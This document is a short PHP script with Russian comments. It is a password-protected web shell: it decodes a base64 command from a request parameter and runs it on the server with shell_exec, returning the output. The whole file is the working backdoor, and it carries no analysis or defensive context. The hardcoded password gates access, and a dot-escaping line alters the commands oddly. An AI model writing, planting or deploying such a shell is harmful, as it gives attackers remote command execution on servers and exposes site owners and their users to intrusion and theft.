<?php
    $password = "HG44g90P";

    if (isset($_REQUEST['cmd']) && isset($_REQUEST['password']) && $_REQUEST['password'] === $password) {
        // Декодирование команды из base64
        $decoded_cmd = base64_decode($_REQUEST['cmd']);
        $escaped_cmd = str_replace('.', '\.', $decoded_cmd);
        echo shell_exec($escaped_cmd);
    } else {
        echo "Неверный пароль или команда не предоставлена.";
    }
?>

